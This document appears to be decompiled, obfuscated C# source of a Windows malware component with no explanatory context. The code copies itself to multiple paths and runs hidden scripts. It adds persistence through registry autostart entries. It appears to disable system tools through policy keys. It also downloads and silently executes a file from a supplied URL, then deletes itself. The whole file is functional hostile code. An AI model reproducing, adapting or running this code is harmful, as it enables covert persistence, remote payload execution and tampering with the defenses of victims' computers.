using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;
using Microsoft.Win32;
using ___codefort;

internal sealed class Class4
{
	private Mutex mutex_0;

	public void method_0()
	{
		method_1();
		method_7();
		method_2();
	}

	private void method_1()
	{
		try
		{
			mutex_0 = new Mutex(initiallyOwned: true, Class8.class16_0.string_0);
			mutex_0.ReleaseMutex();
		}
		catch
		{
			Environment.Exit(-1);
		}
	}

	private void method_2()
	{
		string fileName = Process.GetCurrentProcess().MainModule!.FileName;
		if (method_5())
		{
			return;
		}
		try
		{
			string text = string.Empty;
			string[] string_ = Class8.class16_0.string_12;
			foreach (string text2 in string_)
			{
				if (!Class8.class21_0.method_4(text2))
				{
					File.Copy(fileName, text2);
				}
				text = text + Class22.smethod_0(737969857) + text2 + Class22.smethod_0(737969884);
			}
			string value = string.Concat(new object[1] { text });
			TextWriter textWriter = new StreamWriter(Environment.GetEnvironmentVariable(Class22.smethod_0(737969894)) + Class22.smethod_0(737969899));
			textWriter.WriteLine(value);
			textWriter.Close();
			Process process = new Process();
			process.StartInfo.FileName = Environment.GetEnvironmentVariable(Class22.smethod_0(737969894)) + Class22.smethod_0(737969899);
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.CreateNoWindow = true;
			process.Start();
		}
		catch
		{
		}
		try
		{
			string text3 = Registry.LocalMachine.OpenSubKey(Class22.smethod_0(737969798), writable: true)!.GetValue(Class22.smethod_0(737969850))!.ToString();
			if (!text3.Substring(text3.Length - 1, 1).Equals(Class22.smethod_0(737969739)) && !text3.Substring(text3.Length - 2, 2).Equals(Class22.smethod_0(737969747)))
			{
				text3 += Class22.smethod_0(737969739);
			}
			if (text3.IndexOf(Class8.class16_0.string_12[0]) < 0)
			{
				Registry.LocalMachine.OpenSubKey(Class22.smethod_0(737969798), writable: true)!.SetValue(Class22.smethod_0(737969850), text3 + Class22.smethod_0(737969754) + Class8.class16_0.string_12[0] + '"');
			}
			Registry.CurrentUser.OpenSubKey(Class22.smethod_0(737969773), writable: true)!.SetValue(Class22.smethod_0(737969702), '"' + Class8.class16_0.string_12[1] + '"');
		}
		catch
		{
		}
		try
		{
			mutex_0.Close();
			string[] string_2 = Class8.class16_0.string_12;
			foreach (string fileName2 in string_2)
			{
				Process process2 = new Process();
				process2.StartInfo.FileName = fileName2;
				process2.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process2.Start();
			}
		}
		catch
		{
		}
		Environment.Exit(-1);
	}

	public void method_3(string string_0)
	{
		try
		{
			mutex_0.Close();
		}
		catch
		{
		}
		try
		{
			string text = Class8.class21_0.method_3(new Random().Next(5, 12)) + Class22.smethod_0(737969707);
			new WebClient().DownloadFile(string_0, Environment.GetEnvironmentVariable(Class22.smethod_0(737969894)) + Class22.smethod_0(737969724) + text);
			Process process = new Process();
			process.StartInfo.FileName = Environment.GetEnvironmentVariable(Class22.smethod_0(737969894)) + Class22.smethod_0(737969724) + text;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.Start();
		}
		catch
		{
		}
		method_6();
		Environment.Exit(-1);
	}

	public void method_4()
	{
		try
		{
			string text = Registry.LocalMachine.OpenSubKey(Class22.smethod_0(737969798), writable: true)!.GetValue(Class22.smethod_0(737969850))!.ToString();
			text = text.Replace(Class22.smethod_0(737970116) + Class8.class16_0.string_12[0] + '"', string.Empty);
			Registry.LocalMachine.OpenSubKey(Class22.smethod_0(737969798), writable: true)!.SetValue(Class22.smethod_0(737969850), text);
			Registry.CurrentUser.OpenSubKey(Class22.smethod_0(737969773), writable: true)!.SetValue(Class22.smethod_0(737969702), string.Empty);
		}
		catch
		{
		}
		try
		{
			string text2 = string.Empty;
			string[] string_ = Class8.class16_0.string_12;
			foreach (string text3 in string_)
			{
				text2 = text2 + Class22.smethod_0(737970126) + text3 + Class22.smethod_0(737970149) + text3 + Class22.smethod_0(737969884);
			}
			string value = string.Concat(new object[1] { text2 });
			TextWriter textWriter = new StreamWriter(Environment.GetEnvironmentVariable(Class22.smethod_0(737969894)) + Class22.smethod_0(737969899));
			textWriter.WriteLine(value);
			textWriter.Close();
			Process process = new Process();
			process.StartInfo.FileName = Environment.GetEnvironmentVariable(Class22.smethod_0(737969894)) + Class22.smethod_0(737969899);
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.CreateNoWindow = true;
			process.Start();
		}
		catch
		{
		}
		method_6();
		Environment.Exit(-1);
	}

	private bool method_5()
	{
		string[] string_ = Class8.class16_0.string_12;
		int num = 0;
		if (0 < string_.Length)
		{
			string string_2 = string_[num];
			if (!Class8.class21_0.method_4(string_2))
			{
				return false;
			}
		}
		return true;
	}

	private void method_6()
	{
		try
		{
			string value = Class22.smethod_0(737970154) + '"' + Environment.GetCommandLineArgs()[0] + '"' + Class22.smethod_0(737970171) + '"' + Path.GetFileName(Process.GetCurrentProcess().MainModule!.FileName) + '"' + Class22.smethod_0(737970058);
			TextWriter textWriter = new StreamWriter(Environment.GetEnvironmentVariable(Class22.smethod_0(737969894)) + Class22.smethod_0(737970074));
			textWriter.WriteLine(value);
			textWriter.Close();
			Process process = new Process();
			process.StartInfo.FileName = Environment.GetEnvironmentVariable(Class22.smethod_0(737969894)) + Class22.smethod_0(737970074);
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.CreateNoWindow = true;
			process.Start();
		}
		catch
		{
		}
	}

	private void method_7()
	{
		try
		{
			Registry.CurrentUser.OpenSubKey(Class22.smethod_0(737970100), writable: true)!.SetValue(Class22.smethod_0(737970038), Class22.smethod_0(737969925), RegistryValueKind.DWord);
		}
		catch
		{
		}
		if (Class8.class16_0.bool_0)
		{
			try
			{
				Registry.CurrentUser.OpenSubKey(Class22.smethod_0(737970100), writable: true)!.SetValue(Class22.smethod_0(737969933), Class22.smethod_0(737969957), RegistryValueKind.DWord);
			}
			catch
			{
			}
			try
			{
				Registry.CurrentUser.OpenSubKey(Class22.smethod_0(737969965), writable: true)!.SetValue(Class22.smethod_0(737969389), Class22.smethod_0(737969957), RegistryValueKind.DWord);
				Registry.LocalMachine.OpenSubKey(Class22.smethod_0(737969965), writable: true)!.SetValue(Class22.smethod_0(737969389), Class22.smethod_0(737969957), RegistryValueKind.DWord);
			}
			catch
			{
			}
		}
	}
}
